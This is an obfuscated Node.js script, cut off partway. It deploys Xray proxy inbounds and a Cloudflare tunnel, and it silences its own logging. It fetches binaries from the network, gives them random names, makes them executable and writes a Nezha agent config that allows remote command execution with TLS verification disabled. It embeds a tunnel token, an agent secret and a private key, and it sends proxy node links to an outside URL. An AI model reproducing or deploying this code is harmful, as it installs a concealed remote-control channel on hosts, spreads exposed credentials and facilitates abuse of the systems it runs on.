#!/usr/bin/env node

const _0x238ceb = _0x3e1d
;(function (_0x231ba3, _0x867bd3) {
  const _0x48402f = { _0x5f3ee3: 0x202, _0x1f0fe9: 0x1c2, _0x1f8671: 0x280, _0x389b81: 0x174, _0x2a4e1e: 0x196, _0x197401: 0x1a5 },
    _0x3155b5 = _0x3e1d,
    _0x136962 = _0x231ba3()
  while (!![]) {
    try {
      const _0x524187 =
        parseInt(_0x3155b5(_0x48402f._0x5f3ee3)) / 0x1 +
        (parseInt(_0x3155b5(_0x48402f._0x1f0fe9)) / 0x2) * (-parseInt(_0x3155b5(_0x48402f._0x1f8671)) / 0x3) +
        parseInt(_0x3155b5(_0x48402f._0x389b81)) / 0x4 +
        (parseInt(_0x3155b5(0x247)) / 0x5) * (-parseInt(_0x3155b5(_0x48402f._0x2a4e1e)) / 0x6) +
        -parseInt(_0x3155b5(0x189)) / 0x7 +
        -parseInt(_0x3155b5(_0x48402f._0x197401)) / 0x8 +
        parseInt(_0x3155b5(0x23e)) / 0x9
      if (_0x524187 === _0x867bd3) break
      else _0x136962['push'](_0x136962['shift']())
    } catch (_0x4b1cd8) {
      _0x136962['push'](_0x136962['shift']())
    }
  }
})(_0x41d4, 0x5a142)
const http = require('http'),
  axios = require('axios'),
  os = require('os'),
  fs = require('fs'),
  path = require('path'),
  crypto = require(_0x238ceb(0x274)),
  { promisify } = require(_0x238ceb(0x1f8)),
  { exec: execCommand, execSync } = require(_0x238ceb(0x227)),
  exec = promisify(execCommand),
  PORT = process[_0x238ceb(0x27c)][_0x238ceb(0x217)] || 0xbb8,
  SUB_PATH = process[_0x238ceb(0x27c)][_0x238ceb(0x203)] || _0x238ceb(0x277),
  NAME = process['env'][_0x238ceb(0x245)] || _0x238ceb(0x260),
  CFIP = process[_0x238ceb(0x27c)]['CFIP'] || _0x238ceb(0x18a),
  CFPORT = process[_0x238ceb(0x27c)][_0x238ceb(0x22c)] || 0x1bb,
  UPLOAD_URL = process[_0x238ceb(0x27c)][_0x238ceb(0x219)] || '',
  PROJECT_URL = process[_0x238ceb(0x27c)]['PROJECT_URL'] || '',
  AUTO_ACCESS = process[_0x238ceb(0x27c)]['AUTO_ACCESS'] || ![],
  FILE_PATH = process['env']['FILE_PATH'] || _0x238ceb(0x204),
  NEZHA_SERVER = process[_0x238ceb(0x27c)][_0x238ceb(0x19d)] || _0x238ceb(0x1db),
  NEZHA_PORT = process['env'][_0x238ceb(0x24c)] || '',
  NEZHA_KEY = process['env'][_0x238ceb(0x268)] || '66ObGFyWnpwsEsGhy5y2jcBf21YSltY8',
  UUID = process[_0x238ceb(0x27c)][_0x238ceb(0x1ef)] || '8d3e5489-3c01-4b0f-9705-120225bc07ba',
  ARGO_AUTH =
    process[_0x238ceb(0x27c)]['ARGO_AUTH'] ||
    'eyJhIjoiNmZmODU4N2QwZDM1OGZiYzUyOTk2ZGI0NjUwNjZjNWUiLCJ0IjoiYzVlMjk4OGEtZGUxYi00ODRmLWIwZWItYjBiNTc4NDFjYzA2IiwicyI6Ik5ETXhOekpqTUdJdE5qRXhaUzAwWXpsaExXSmpOemd0WVdZMk5UazRZbVExTW1FMCJ9',
  ARGO_DOMAIN = process[_0x238ceb(0x27c)][_0x238ceb(0x1b7)] || _0x238ceb(0x26d),
  ARGO_PORT = process[_0x238ceb(0x27c)][_0x238ceb(0x272)] || 0xe2e1,
  S5_PORT = process['env'][_0x238ceb(0x1a9)] || '',
  HY2_PORT = process[_0x238ceb(0x27c)][_0x238ceb(0x1d2)] || '',
  REALITY_PORT = process[_0x238ceb(0x27c)]['REALITY_PORT'] || '',
  CHAT_ID = process[_0x238ceb(0x27c)]['CHAT_ID'] || _0x238ceb(0x1ff),
  BOT_TOKEN = process[_0x238ceb(0x27c)]['BOT_TOKEN'] || _0x238ceb(0x20d),
  SHOW_LOG = !['false', _0x238ceb(0x282), 'no'][_0x238ceb(0x1b4)]((process[_0x238ceb(0x27c)][_0x238ceb(0x1ae)] || _0x238ceb(0x251))['toLowerCase']())
!SHOW_LOG && ((console[_0x238ceb(0x1e6)] = () => {}), (console[_0x238ceb(0x1ba)] = () => {}))
function alwaysLog(_0x35b46b) {
  const _0x4154b0 = { _0x584874: 0x213 },
    _0x4a805b = _0x238ceb
  process[_0x4a805b(_0x4154b0._0x584874)]['write'](_0x35b46b + '\x0a')
}
function _0x3e1d(_0x1eb1da, _0xd23025) {
  const _0x41d404 = _0x41d4()
  return (
    (_0x3e1d = function (_0x3e1d1d, _0x475812) {
      _0x3e1d1d = _0x3e1d1d - 0x16f
      let _0x155592 = _0x41d404[_0x3e1d1d]
      return _0x155592
    }),
    _0x3e1d(_0x1eb1da, _0xd23025)
  )
}
if (!fs['existsSync'](FILE_PATH)) fs[_0x238ceb(0x266)](FILE_PATH)
else {
}
function isValidPort(_0x5c32b0) {
  const _0x390b08 = { _0x225b9c: 0x23d },
    _0x54b6df = _0x238ceb
  try {
    if (_0x5c32b0 === null || _0x5c32b0 === undefined || _0x5c32b0 === '') return ![]
    if (typeof _0x5c32b0 === 'string' && _0x5c32b0[_0x54b6df(_0x390b08._0x225b9c)]() === '') return ![]
    const _0x433a0c = parseInt(_0x5c32b0)
    if (isNaN(_0x433a0c)) return ![]
    if (_0x433a0c < 0x1 || _0x433a0c > 0xffff) return ![]
    return !![]
  } catch (_0x35fd6d) {
    return ![]
  }
}
function generateRandomName() {
  const _0x550e1e = { _0x4971b5: 0x1f3, _0x5c187f: 0x1a0 },
    _0x191e11 = _0x238ceb,
    _0x5ecb02 = 'abcdefghijklmnopqrstuvwxyz'
  let _0x18b4e4 = ''
  for (let _0x5dc740 = 0x0; _0x5dc740 < 0x6; _0x5dc740++) {
    _0x18b4e4 += _0x5ecb02[_0x191e11(_0x550e1e._0x4971b5)](Math[_0x191e11(_0x550e1e._0x5c187f)](Math['random']() * _0x5ecb02[_0x191e11(0x1cd)]))
  }
  return _0x18b4e4
}
let subContent = null,
  privateKey = '',
  publicKey = ''
const npmName = generateRandomName(),
  webName = generateRandomName(),
  botName = generateRandomName(),
  phpName = generateRandomName()
let npmPath = path[_0x238ceb(0x1a1)](FILE_PATH, npmName),
  phpPath = path[_0x238ceb(0x1a1)](FILE_PATH, phpName),
  webPath = path[_0x238ceb(0x1a1)](FILE_PATH, webName),
  botPath = path[_0x238ceb(0x1a1)](FILE_PATH, botName),
  subPath = path[_0x238ceb(0x1a1)](FILE_PATH, _0x238ceb(0x276)),
  listPath = path['join'](FILE_PATH, _0x238ceb(0x218)),
  bootLogPath = path[_0x238ceb(0x1a1)](FILE_PATH, _0x238ceb(0x1ea)),
  configPath = path['join'](FILE_PATH, _0x238ceb(0x177)),
  certPath = path['resolve'](FILE_PATH, 'cert.pem'),
  keyPath = path[_0x238ceb(0x1e5)](FILE_PATH, _0x238ceb(0x25f))
function deleteNodes() {
  const _0x1e1fe2 = { _0x394aad: 0x25e, _0x4e7e2a: 0x1f2, _0x405a26: 0x1d9, _0x308d39: 0x1cd, _0xfef017: 0x1c4, _0x546abf: 0x21c },
    _0x2010dd = _0x238ceb
  try {
    if (!UPLOAD_URL) return
    if (!fs[_0x2010dd(_0x1e1fe2._0x394aad)](subPath)) return
    let _0x30c9e8
    try {
      _0x30c9e8 = fs['readFileSync'](subPath, _0x2010dd(0x181))
    } catch {
      return null
    }
    const _0x578ca7 = Buffer[_0x2010dd(_0x1e1fe2._0x4e7e2a)](_0x30c9e8, _0x2010dd(0x26e))[_0x2010dd(_0x1e1fe2._0x405a26)]('utf-8'),
      _0xda38cd = _0x578ca7[_0x2010dd(0x1c8)]('\x0a')[_0x2010dd(0x1ce)]((_0x40f0c3) =>
        /(vless|vmess|trojan|hysteria2|socks):\/\//[_0x2010dd(0x1d4)](_0x40f0c3)
      )
    if (_0xda38cd[_0x2010dd(_0x1e1fe2._0x308d39)] === 0x0) return
    return (
      axios[_0x2010dd(_0x1e1fe2._0xfef017)](UPLOAD_URL + _0x2010dd(0x22b), JSON[_0x2010dd(_0x1e1fe2._0x546abf)]({ nodes: _0xda38cd }), {
        headers: { 'Content-Type': 'application/json' }
      })[_0x2010dd(0x249)]((_0x1eaffc) => {
        return null
      }),
      null
    )
  } catch (_0x1f01eb) {
    return null
  }
}
function cleanupOldFiles() {
  const _0xdefe3a = { _0x20cf99: 0x1aa },
    _0x4c6ae0 = _0x238ceb
  try {
    const _0x252e2a = fs[_0x4c6ae0(_0xdefe3a._0x20cf99)](FILE_PATH)
    _0x252e2a['forEach']((_0x52fe85) => {
      const _0x530dea = _0x4c6ae0,
        _0x16f972 = path['join'](FILE_PATH, _0x52fe85)
      try {
        const _0x524008 = fs['statSync'](_0x16f972)
        _0x524008['isFile']() && fs[_0x530dea(0x233)](_0x16f972)
      } catch (_0x1271ed) {}
    })
  } catch (_0xf0a57f) {}
}
function generateX25519Keypair() {
  const _0x209e43 = { _0x159363: 0x186, _0x2d3f1e: 0x17b, _0x2d25b9: 0x1b1, _0x59aacb: 0x1d3, _0x5441ee: 0x1d9, _0x3b688e: 0x188 },
    _0x3e733d = _0x238ceb,
    { publicKey: _0x8c4634, privateKey: _0x765c02 } = crypto[_0x3e733d(0x244)](_0x3e733d(_0x209e43._0x159363)),
    _0x310dec = _0x765c02[_0x3e733d(_0x209e43._0x2d3f1e)]({ type: _0x3e733d(0x1ad), format: 'der' })[_0x3e733d(0x1d3)](-0x20),
    _0x4a00a5 = _0x8c4634[_0x3e733d(0x17b)]({ type: _0x3e733d(0x23f), format: _0x3e733d(_0x209e43._0x2d25b9) })[_0x3e733d(_0x209e43._0x59aacb)](-0x20)
  return { privateKey: _0x310dec[_0x3e733d(_0x209e43._0x5441ee)](_0x3e733d(_0x209e43._0x3b688e)), publicKey: _0x4a00a5['toString']('base64url') }
}
function generateOrLoadKeyPair() {
  const _0x117082 = { _0x46f022: 0x192, _0x13619b: 0x1b2, _0x4f747e: 0x26b, _0x1b11ef: 0x171, _0x34b0fb: 0x269, _0x4be89c: 0x1e2, _0x767a87: 0x23b },
    _0x102fb0 = _0x238ceb,
    _0x2840ea = path[_0x102fb0(0x1a1)](FILE_PATH, _0x102fb0(0x1cc))
  if (fs['existsSync'](_0x2840ea)) {
    const _0x5bcbcc = fs[_0x102fb0(_0x117082._0x46f022)](_0x2840ea, 'utf8'),
      _0x95f81d = _0x5bcbcc[_0x102fb0(0x25c)](/PrivateKey:\s*(.*)/),
      _0x1239aa = _0x5bcbcc['match'](/PublicKey:\s*(.*)/)
    if (_0x95f81d && _0x1239aa) {
      ;((privateKey = _0x95f81d[0x1]['trim']()),
        (publicKey = _0x1239aa[0x1]['trim']()),
        console['log'](_0x102fb0(_0x117082._0x13619b), privateKey),
        console['log'](_0x102fb0(_0x117082._0x4f747e), publicKey))
      return
    }
  }
  const _0x4c6c7a = generateX25519Keypair()
  ;((privateKey = _0x4c6c7a['privateKey']),
    (publicKey = _0x4c6c7a[_0x102fb0(_0x117082._0x1b11ef)]),
    fs[_0x102fb0(0x25a)](
      _0x2840ea,
      _0x102fb0(_0x117082._0x34b0fb) + privateKey + _0x102fb0(_0x117082._0x4be89c) + publicKey + '\x0a',
      _0x102fb0(_0x117082._0x767a87)
    ),
    console[_0x102fb0(0x1e6)](_0x102fb0(0x1b2), privateKey),
    console['log'](_0x102fb0(0x26b), publicKey))
}
const FALLBACK_EC_KEY =
    _0x238ceb(0x1bc) +
    _0x238ceb(0x26f) +
    _0x238ceb(0x1f0) +
    '-----BEGIN\x20EC\x20PRIVATE\x20KEY-----\x0a' +
    'MHcCAQEEIM4792SEtPqIt1ywqTd/0bYidBqpYV/++siNnfBYsdUYoAoGCCqGSM49\x0a' +
    _0x238ceb(0x22d) +
    _0x238ceb(0x257) +
    _0x238ceb(0x211),
  FALLBACK_CERT =
    _0x238ceb(0x267) +
    _0x238ceb(0x216) +
    _0x238ceb(0x281) +
    'MDIyWjATMREwDwYDVQQDDAhiaW5nLmNvbTBZMBMGByqGSM49AgEGCCqGSM49AwEH\x0a' +
    _0x238ceb(0x24f) +
    'aD5IS8Um3oR/zQRIx7UmRmg4TKmjUzBRMB0GA1UdDgQWBBTV1cFID7UISE7PLTBR\x0a' +
    _0x238ceb(0x234) +
    'Af8EBTADAQH/MAoGCCqGSM49BAMCA0cAMEQCIAIDAJvg0vd/ytrQVvEcSm6XTlB+\x0a' +
    'eQ6OFb9LbLYL9f+sAiAffoMbi4y/0YUSlTtz7as9S8/lciBF5VCUoVIKS+vX2g==\x0a' +
    _0x238ceb(0x1d6)
function ensureTlsCertificates(_0x1b4149, _0x2dda09) {
  const _0x5aa8c3 = { _0x240696: 0x25e, _0x53915d: 0x19b, _0x5df389: 0x1dd, _0x1491c7: 0x226, _0x3f9041: 0x18e, _0x443f02: 0x1fc, _0x51c643: 0x25a },
    _0x2430c3 = _0x238ceb
  if (fs[_0x2430c3(_0x5aa8c3._0x240696)](_0x1b4149) && fs[_0x2430c3(_0x5aa8c3._0x240696)](_0x2dda09)) return
  fs[_0x2430c3(0x266)](path[_0x2430c3(_0x5aa8c3._0x53915d)](_0x1b4149), { recursive: !![] })
  try {
    ;(execSync(_0x2430c3(_0x5aa8c3._0x5df389), { stdio: _0x2430c3(_0x5aa8c3._0x1491c7) }),
      execSync(_0x2430c3(_0x5aa8c3._0x3f9041) + _0x2dda09 + '\x22', { stdio: 'ignore' }),
      execSync(_0x2430c3(_0x5aa8c3._0x443f02) + _0x2dda09 + _0x2430c3(0x264) + _0x1b4149 + '\x22\x20-subj\x20\x22/CN=bing.com\x22', {
        stdio: _0x2430c3(0x226)
      }))
    return
  } catch (_0x724021) {}
  ;(fs[_0x2430c3(_0x5aa8c3._0x51c643)](_0x2dda09, FALLBACK_EC_KEY), fs[_0x2430c3(0x25a)](_0x1b4149, FALLBACK_CERT))
}
function getCertificateFingerprint(_0x37abf3) {
  const _0x338d43 = { _0xa39cc6: 0x197, _0x1d5545: 0x25c, _0x223886: 0x1f2, _0x385ddf: 0x1f5, _0x4c681b: 0x253 },
    _0x3133d4 = _0x238ceb
  try {
    const _0x101f58 = execSync(_0x3133d4(0x21d) + _0x37abf3 + '\x22', { encoding: _0x3133d4(0x23b), timeout: 0xbb8 })[_0x3133d4(0x23d)](),
      _0x497fa7 = _0x101f58['match'](/=(.+)$/)
    if (_0x497fa7 && _0x497fa7[0x1]) return _0x497fa7[0x1][_0x3133d4(_0x338d43._0xa39cc6)]()
  } catch (_0x46c1ce) {}
  try {
    const _0x320176 = fs['readFileSync'](_0x37abf3, 'utf8'),
      _0x388e24 = _0x320176[_0x3133d4(_0x338d43._0x1d5545)](/-----BEGIN CERTIFICATE-----([\s\S]+?)-----END CERTIFICATE-----/)
    if (!_0x388e24) return ''
    const _0x250b8d = _0x388e24[0x1][_0x3133d4(0x220)](/\s/g, ''),
      _0x206464 = Buffer[_0x3133d4(_0x338d43._0x223886)](_0x250b8d, _0x3133d4(0x26e)),
      _0x4b324c = crypto[_0x3133d4(_0x338d43._0x385ddf)]('sha256')['update'](_0x206464)[_0x3133d4(_0x338d43._0x4c681b)](_0x3133d4(0x1fb))
    return _0x4b324c[_0x3133d4(_0x338d43._0x1d5545)](/.{2}/g)['join'](':')[_0x3133d4(0x197)]()
  } catch (_0x191078) {
    return (console[_0x3133d4(0x1ba)]('Failed\x20to\x20calculate\x20certificate\x20fingerprint:', _0x191078), '')
  }
}
async function generateConfig() {
  const _0x142b2e = {
      _0x3049ae: 0x1eb,
      _0xed90da: 0x1d7,
      _0x1222d9: 0x265,
      _0x2e4d6c: 0x206,
      _0x132e04: 0x230,
      _0xe32cd6: 0x284,
      _0x2483c8: 0x206,
      _0x3506f9: 0x228,
      _0x3f9a9d: 0x206,
      _0x5626bb: 0x1b6,
      _0x5f1a72: 0x191,
      _0xdcb121: 0x1f9,
      _0x12d053: 0x191,
      _0x5edfdf: 0x206,
      _0x3bc5d6: 0x24a,
      _0x7647bc: 0x22a,
      _0x29803d: 0x1bf,
      _0x3843ff: 0x1ac,
      _0x1cbde: 0x21e,
      _0x1583af: 0x182,
      _0x1abb8e: 0x184,
      _0x4c3c62: 0x1cb,
      _0x2bd8b3: 0x241,
      _0x346546: 0x1e0,
      _0xbd5385: 0x207,
      _0x3756ec: 0x190,
      _0x13852a: 0x279,
      _0x27ebfe: 0x25a,
      _0x69c95a: 0x1a1
    },
    _0x344d80 = _0x238ceb,
    _0x7c5dcc = {
      log: { access: '/dev/null', error: _0x344d80(_0x142b2e._0x3049ae), loglevel: _0x344d80(0x206) },
      inbounds: [
        {
          tag: _0x344d80(_0x142b2e._0xed90da),
          port: ARGO_PORT,
          listen: '::',
          protocol: _0x344d80(0x21e),
          settings: {
            clients: [{ id: UUID, flow: _0x344d80(_0x142b2e._0x1222d9) }],
            decryption: _0x344d80(_0x142b2e._0x2e4d6c),
            fallbacks: [
              { dest: 0xbb9 },
              { path: '/vless-argo', dest: 0xbba },
              { path: _0x344d80(0x1f9), dest: 0xbbb },
              { path: _0x344d80(_0x142b2e._0x132e04), dest: 0xbbc }
            ]
          },
          streamSettings: { network: _0x344d80(0x284) }
        },
        {
          tag: 'vless-tcp-in',
          port: 0xbb9,
          listen: '127.0.0.1',
          protocol: _0x344d80(0x21e),
          settings: { clients: [{ id: UUID }], decryption: 'none' },
          streamSettings: { network: _0x344d80(_0x142b2e._0xe32cd6), security: _0x344d80(_0x142b2e._0x2483c8) }
        },
        {
          tag: _0x344d80(0x27d),
          port: 0xbba,
          listen: _0x344d80(_0x142b2e._0x3506f9),
          protocol: _0x344d80(0x21e),
          settings: { clients: [{ id: UUID, level: 0x0 }], decryption: _0x344d80(_0x142b2e._0x2e4d6c) },
          streamSettings: { network: 'ws', security: _0x344d80(_0x142b2e._0x3f9a9d), wsSettings: { path: _0x344d80(_0x142b2e._0x5626bb) } },
          sniffing: { enabled: !![], destOverride: [_0x344d80(0x24e), _0x344d80(0x241), _0x344d80(_0x142b2e._0x5f1a72)], metadataOnly: ![] }
        },
        {
          tag: _0x344d80(0x21b),
          port: 0xbbb,
          listen: '127.0.0.1',
          protocol: 'vmess',
          settings: { clients: [{ id: UUID, alterId: 0x0 }] },
          streamSettings: { network: 'ws', wsSettings: { path: _0x344d80(_0x142b2e._0xdcb121) } },
          sniffing: { enabled: !![], destOverride: ['http', _0x344d80(0x241), _0x344d80(_0x142b2e._0x12d053)], metadataOnly: ![] }
        },
        {
          tag: 'trojan-ws-in',
          port: 0xbbc,
          listen: _0x344d80(_0x142b2e._0x3506f9),
          protocol: _0x344d80(0x1f1),
          settings: { clients: [{ password: UUID }] },
          streamSettings: { network: 'ws', security: _0x344d80(_0x142b2e._0x5edfdf), wsSettings: { path: _0x344d80(_0x142b2e._0x132e04) } },
          sniffing: { enabled: !![], destOverride: ['http', _0x344d80(0x241), 'quic'], metadataOnly: ![] }
        }
      ],
      dns: { servers: ['https+local://8.8.8.8/dns-query'] },
      outbounds: [
        { protocol: _0x344d80(_0x142b2e._0x3bc5d6), tag: _0x344d80(_0x142b2e._0x7647bc) },
        { protocol: 'blackhole', tag: _0x344d80(_0x142b2e._0x29803d) }
      ]
    }
  ;(isValidPort(REALITY_PORT) &&
    _0x7c5dcc[_0x344d80(_0x142b2e._0x3843ff)]['push']({
      tag: 'vless-in',
      listen: '::',
      port: parseInt(REALITY_PORT),
      protocol: _0x344d80(_0x142b2e._0x1cbde),
      settings: { clients: [{ id: UUID, flow: _0x344d80(_0x142b2e._0x1222d9) }], decryption: _0x344d80(0x206) },
      streamSettings: {
        network: 'raw',
        security: _0x344d80(_0x142b2e._0x1583af),
        realitySettings: {
          show: ![],
          dest: 'www.iij.ad.jp:443',
          xver: 0x0,
          serverNames: [_0x344d80(_0x142b2e._0x1abb8e)],
          privateKey: privateKey,
          shortIds: ['']
        }
      }
    }),
    isValidPort(HY2_PORT) &&
      _0x7c5dcc[_0x344d80(0x1ac)][_0x344d80(0x1e0)]({
        tag: _0x344d80(0x1da),
        listen: '::',
        port: parseInt(HY2_PORT),
        protocol: _0x344d80(0x1cb),
        settings: { version: 0x2, clients: [{ auth: UUID }] },
        streamSettings: {
          network: _0x344d80(_0x142b2e._0x4c3c62),
          hysteriaSettings: { version: 0x2, masquerade: { type: _0x344d80(0x176), url: _0x344d80(0x17a) } },
          security: _0x344d80(_0x142b2e._0x2bd8b3),
          tlsSettings: { alpn: ['h3'], certificates: [{ certificateFile: certPath, keyFile: keyPath }] }
        }
      }),
    isValidPort(S5_PORT) &&
      _0x7c5dcc[_0x344d80(_0x142b2e._0x3843ff)][_0x344d80(_0x142b2e._0x346546)]({
        tag: _0x344d80(0x232),
        listen: '::',
        port: parseInt(S5_PORT),
        protocol: _0x344d80(_0x142b2e._0xbd5385),
        settings: {
          auth: 'password',
          accounts: [{ user: UUID[_0x344d80(_0x142b2e._0x3756ec)](0x0, 0x8), pass: UUID[_0x344d80(_0x142b2e._0x13852a)](-0xc) }],
          udp: !![]
        }
      }),
    fs[_0x344d80(_0x142b2e._0x27ebfe)](path[_0x344d80(_0x142b2e._0x69c95a)](FILE_PATH, 'config.json'), JSON['stringify'](_0x7c5dcc, null, 0x2)))
}
function getSystemArchitecture() {
  const _0xd0164c = { _0x2a8dcc: 0x17c, _0x3581ff: 0x243, _0x47e049: 0x238 },
    _0x3cc270 = _0x238ceb,
    _0x102544 = os['arch']()
  return _0x102544 === _0x3cc270(_0xd0164c._0x2a8dcc) || _0x102544 === _0x3cc270(_0xd0164c._0x3581ff) || _0x102544 === _0x3cc270(0x235)
    ? _0x3cc270(0x17c)
    : _0x3cc270(_0xd0164c._0x47e049)
}
function downloadFile(_0x4bdf5f, _0x22969b, _0x4583df) {
  const _0x59255d = { _0x4b2342: 0x231, _0x45c3db: 0x1a2, _0x1bc0d9: 0x200, _0x49837c: 0x249 },
    _0x16c70e = { _0x2de6c5: 0x173, _0x3976b6: 0x212 },
    _0x4f7f8a = { _0x38df13: 0x256, _0x229249: 0x173 },
    _0x7e82b4 = _0x238ceb,
    _0x414fe7 = _0x4bdf5f,
    _0x2f9753 = _0x414fe7 + '.download'
  !fs[_0x7e82b4(0x25e)](FILE_PATH) && fs[_0x7e82b4(0x266)](FILE_PATH, { recursive: !![] })
  const _0x48931d = fs[_0x7e82b4(_0x59255d._0x4b2342)](_0x2f9753)
  axios({ method: _0x7e82b4(_0x59255d._0x45c3db), url: _0x22969b, responseType: _0x7e82b4(_0x59255d._0x1bc0d9) })
    [_0x7e82b4(0x21f)]((_0xb595b5) => {
      const _0x3da8e1 = { _0x1679a7: 0x1ab, _0x5f2f5b: 0x271, _0x441cca: 0x246, _0x27fcb5: 0x1ba },
        _0x18d715 = _0x7e82b4
      ;(_0xb595b5[_0x18d715(0x210)]['pipe'](_0x48931d),
        _0x48931d['on']('finish', () => {
          const _0x51ed84 = _0x18d715
          _0x48931d[_0x51ed84(0x27f)]((_0x3ca195) => {
            const _0x4f9042 = _0x51ed84
            if (_0x3ca195) {
              const _0x165f78 = 'Download\x20' + path[_0x4f9042(_0x3da8e1._0x1679a7)](_0x414fe7) + '\x20failed:\x20' + _0x3ca195['message']
              ;(fs['unlink'](_0x2f9753, () => {}), console[_0x4f9042(0x1ba)](_0x165f78), _0x4583df(_0x165f78))
              return
            }
            try {
              fs[_0x4f9042(_0x3da8e1._0x5f2f5b)](_0x2f9753, _0x414fe7)
            } catch (_0x57ad4f) {
              const _0x424219 = _0x4f9042(0x173) + path['basename'](_0x414fe7) + _0x4f9042(0x212) + _0x57ad4f[_0x4f9042(_0x3da8e1._0x441cca)]
              ;(fs['unlink'](_0x2f9753, () => {}), console[_0x4f9042(_0x3da8e1._0x27fcb5)](_0x424219), _0x4583df(_0x424219))
              return
            }
            ;(console['log'](_0x4f9042(0x173) + path['basename'](_0x414fe7) + _0x4f9042(0x242)), _0x4583df(null, _0x414fe7))
          })
        }),
        _0x48931d['on'](_0x18d715(0x1ba), (_0x3ce600) => {
          const _0x426713 = _0x18d715
          fs[_0x426713(_0x4f7f8a._0x38df13)](_0x2f9753, () => {})
          const _0x376eec = _0x426713(_0x4f7f8a._0x229249) + path[_0x426713(0x1ab)](_0x414fe7) + '\x20failed:\x20' + _0x3ce600[_0x426713(0x246)]
          ;(console['error'](_0x376eec), _0x4583df(_0x376eec))
        }))
    })
    [_0x7e82b4(_0x59255d._0x49837c)]((_0x469044) => {
      const _0x2e69bb = _0x7e82b4
      fs[_0x2e69bb(0x256)](_0x2f9753, () => {})
      const _0x1df209 =
        _0x2e69bb(_0x16c70e._0x2de6c5) + path[_0x2e69bb(0x1ab)](_0x414fe7) + _0x2e69bb(_0x16c70e._0x3976b6) + _0x469044[_0x2e69bb(0x246)]
      ;(console[_0x2e69bb(0x1ba)](_0x1df209), _0x4583df(_0x1df209))
    })
}
async function downloadFilesAndRun() {
  const _0x229663 = {
      _0x30f5bf: 0x1e6,
      _0x258349: 0x1ba,
      _0x30dc4a: 0x225,
      _0x306ae2: 0x1c8,
      _0x475e10: 0x17e,
      _0x1a7bed: 0x1b3,
      _0x266d2e: 0x273,
      _0xb2b44: 0x1f7,
      _0x51d549: 0x25a,
      _0xa44190: 0x1a1,
      _0x1ee353: 0x275,
      _0x30c49d: 0x20a,
      _0x56505c: 0x1e6,
      _0x1a05da: 0x19f,
      _0x1a01a5: 0x229,
      _0x3d054b: 0x214,
      _0xccf68e: 0x1b3,
      _0xf93e3b: 0x1b4,
      _0xc8967: 0x18d,
      _0x5866a: 0x275,
      _0x3afeed: 0x1e1,
      _0x3857fd: 0x25d,
      _0x3f00d9: 0x19f,
      _0x46e33d: 0x236,
      _0x2fe6c1: 0x25e,
      _0x54e3c5: 0x25c,
      _0x17ec89: 0x1b8,
      _0x20406e: 0x1a7,
      _0x227a80: 0x278,
      _0x22795c: 0x26c,
      _0x1cc1ce: 0x1ba
    },
    _0x19f5f3 = _0x238ceb,
    _0x8e2928 = getSystemArchitecture(),
    _0x6d4da7 = getFilesForArchitecture(_0x8e2928)
  if (_0x6d4da7[_0x19f5f3(0x1cd)] === 0x0) {
    console[_0x19f5f3(_0x229663._0x30f5bf)](_0x19f5f3(0x240))
    return
  }
  const _0x3015ec = _0x6d4da7[_0x19f5f3(0x261)]((_0x1434c4) => {
    const _0x222930 = { _0x29c4f1: 0x1fa }
    return new Promise((_0x492b84, _0x400854) => {
      const _0x2aebc3 = (_0x7635fa) => {
        const _0x3777aa = { _0xa25756: 0x1cd, _0x5b6f10: 0x1d8, _0x57ce35: 0x27e },
          _0xb4a0a7 = _0x3e1d
        downloadFile(_0x1434c4['fileName'], _0x1434c4[_0xb4a0a7(_0x222930._0x29c4f1)][_0x7635fa], (_0xce12e1, _0x4ef1c9) => {
          const _0x25e932 = _0xb4a0a7
          if (!_0xce12e1) {
            _0x492b84(_0x4ef1c9)
            return
          }
          if (_0x7635fa + 0x1 < _0x1434c4[_0x25e932(0x1fa)][_0x25e932(_0x3777aa._0xa25756)]) {
            ;(console['log'](_0x25e932(_0x3777aa._0x5b6f10) + path['basename'](_0x1434c4[_0x25e932(_0x3777aa._0x57ce35)]) + _0x25e932(0x23a)),
              _0x2aebc3(_0x7635fa + 0x1))
            return
          }
          _0x400854(_0xce12e1)
        })
      }
      _0x2aebc3(0x0)
    })
  })
  try {
    await Promise[_0x19f5f3(0x26a)](_0x3015ec)
  } catch (_0x52f8a6) {
    console[_0x19f5f3(_0x229663._0x258349)](_0x19f5f3(_0x229663._0x30dc4a), _0x52f8a6)
    return
  }
  function _0x27c0f4(_0x381349) {
    const _0x549a86 = { _0x195a09: 0x1d9 },
      _0x10b94e = _0x19f5f3,
      _0x52d8f7 = 0x1fd
    _0x381349[_0x10b94e(0x1e3)]((_0x6f03ab) => {
      const _0x6824c7 = _0x10b94e
      if (fs['existsSync'](_0x6f03ab))
        try {
          ;(fs['chmodSync'](_0x6f03ab, _0x52d8f7),
            console[_0x6824c7(0x1e6)](_0x6824c7(0x254) + _0x6f03ab + ':\x20' + _0x52d8f7[_0x6824c7(_0x549a86._0x195a09)](0x8)))
        } catch (_0x1df784) {
          console[_0x6824c7(0x1ba)](_0x6824c7(0x1e9) + _0x6f03ab + ':\x20' + _0x1df784)
        }
    })
  }
  const _0x1c4c94 = NEZHA_PORT ? [npmPath, webPath, botPath] : [phpPath, webPath, botPath]
  _0x27c0f4(_0x1c4c94)
  if (NEZHA_SERVER && NEZHA_KEY) {
    if (!NEZHA_PORT) {
      const _0x14875d = NEZHA_SERVER[_0x19f5f3(0x1b4)](':') ? NEZHA_SERVER[_0x19f5f3(_0x229663._0x306ae2)](':')['pop']() : '',
        _0x393bd9 = new Set([
          '443',
          _0x19f5f3(0x1be),
          _0x19f5f3(_0x229663._0x475e10),
          _0x19f5f3(0x252),
          _0x19f5f3(_0x229663._0x1a7bed),
          _0x19f5f3(_0x229663._0x266d2e)
        ]),
        _0x4e988c = _0x393bd9['has'](_0x14875d) ? _0x19f5f3(_0x229663._0xb2b44) : 'false',
        _0x21421b =
          '\x0aclient_secret:\x20' +
          NEZHA_KEY +
          '\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20' +
          NEZHA_SERVER +
          '\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20' +
          _0x4e988c +
          _0x19f5f3(0x1c3) +
          UUID
      fs[_0x19f5f3(_0x229663._0x51d549)](path[_0x19f5f3(_0x229663._0xa44190)](FILE_PATH, 'config.yaml'), _0x21421b)
      const _0x5df269 =
